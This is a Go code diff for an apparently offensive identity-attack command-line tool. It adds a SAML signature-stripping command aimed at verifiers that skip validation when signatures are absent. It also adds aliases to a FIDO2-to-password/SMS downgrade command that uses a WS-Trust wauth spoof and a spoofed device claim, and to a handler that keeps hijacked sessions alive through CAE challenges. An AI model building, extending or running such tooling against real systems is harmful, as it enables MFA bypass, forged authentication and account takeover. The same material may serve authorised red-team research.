@@ -11,21 +11,24 @@ import (
 
 	"github.com/Debajyoti0-0/aether/internal/engine/validate"
 	"github.com/Debajyoti0-0/aether/internal/protocol/oauth2"
+	"github.com/Debajyoti0-0/aether/internal/protocol/saml"
 	"github.com/Debajyoti0-0/aether/internal/protocol/wstrust"
 )
 
-// relayCAECmd implements `aether relay cae-handler`.
+// relayCAECmd implements `aether relay cae-handler` (alias: relay cae).
 var relayCAECmd = &cobra.Command{
-	Use:   "cae-handler",
-	Short: "Auto-retry on CAE claims challenges to keep sessions alive",
-	RunE:  runRelayCAE,
+	Use:     "cae-handler",
+	Aliases: []string{"cae"},
+	Short:   "Auto-retry on CAE claims challenges to keep sessions alive",
+	RunE:    runRelayCAE,
 }
 
-// relayFIDO2Cmd implements `aether relay fido2-downgrade`.
+// relayFIDO2Cmd implements `aether relay fido2-downgrade` (alias: relay fido2).
 var relayFIDO2Cmd = &cobra.Command{
-	Use:   "fido2-downgrade",
-	Short: "Force password/SMS auth class via WS-Trust wauth spoof",
-	RunE:  runRelayFIDO2,
+	Use:     "fido2-downgrade",
+	Aliases: []string{"fido2"},
+	Short:   "Force password/SMS auth class via WS-Trust wauth spoof",
+	RunE:    runRelayFIDO2,
 }
 
 // relayMexCmd implements MEX discovery.
@@ -36,7 +39,6 @@ var relayMexCmd = &cobra.Command{
 }
 
 var (
-	caeToken     string
 	caeRefresh   string
 	caeTenant    string
 	caeClientID  string
@@ -62,7 +64,6 @@ func init() {
 	relayFIDO2Cmd.Flags().StringVar(&fido2Device, "device-claim", "", "Spoofed PRT device claim")
 	relayFIDO2Cmd.Flags().StringVar(&fido2Domain, "domain", "", "Federated domain (required)")
 	relayFIDO2Cmd.Flags().StringVar(&fido2MEXFile, "mex", "", "Local MEX XML file (optional; else discovery by convention)")
-	relayFIDO2Cmd.Flags().StringVar(&fido2Preset, "browser-preset", "chrome", "TLS preset")
 	_ = relayFIDO2Cmd.MarkFlagRequired("username")
 	_ = relayFIDO2Cmd.MarkFlagRequired("domain")
 
@@ -72,17 +73,51 @@ func init() {
 	_ = relayMexCmd.MarkFlagRequired("mex")
 }
 
+// relaySamlStripCmd — SAML signature stripping.
+var relaySamlStripCmd = &cobra.Command{
+	Use:   "saml-strip",
+	Short: "Strip ds:Signature elements from a SAML document",
+	Long: `Remove all ds:Signature wrappers from a SAML assertion/response.
+Targets verifiers that skip validation when no signature is present,
+or that verify only the first assertion's signature.`,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		data, err := os.ReadFile(stripFile)
+		if err != nil {
+			return fmt.Errorf("read saml file: %w", err)
+		}
+		result, err := saml.StripDocument(string(data))
+		if err != nil {
+			return err
+		}
+		if stripOut != "" {
+			if err := os.WriteFile(stripOut, []byte(result.Doc), 0o600); err != nil {
+				return err
+			}
+			fmt.Fprintf(os.Stderr, "Stripped %d signature(s) → %s\n", result.Stripped, stripOut)
+			return nil
+		}
+		fmt.Println(result.Doc)
+		return nil
+	},
+}
+
+var (
+	stripFile string
+	stripOut  string
+)
+
+func init() {
+	relayCmd.AddCommand(relaySamlStripCmd)
+	relaySamlStripCmd.Flags().StringVar(&stripFile, "file", "", "SAML XML file (required)")
+	relaySamlStripCmd.Flags().StringVar(&stripOut, "output", "", "Write stripped XML to file")
+	_ = relaySamlStripCmd.MarkFlagRequired("file")
+}
+
 func runRelayCAE(cmd *cobra.Command, args []string) error {
 	client, err := oauth2.NewClient("chrome", 30*time.Second)
 	if err != nil {
 		return err
 	}
-
-	// Probe the resource with the (possibly stale) token to elicit a
-	// claims challenge, then satisfy it automatically.
-	tokens := &struct{}{}
-	_ = tokens
-	_ = caeToken
 
 	// The handler works directly off the refresh token: request fresh
 	// tokens carrying the CAE claims demanded by policy.
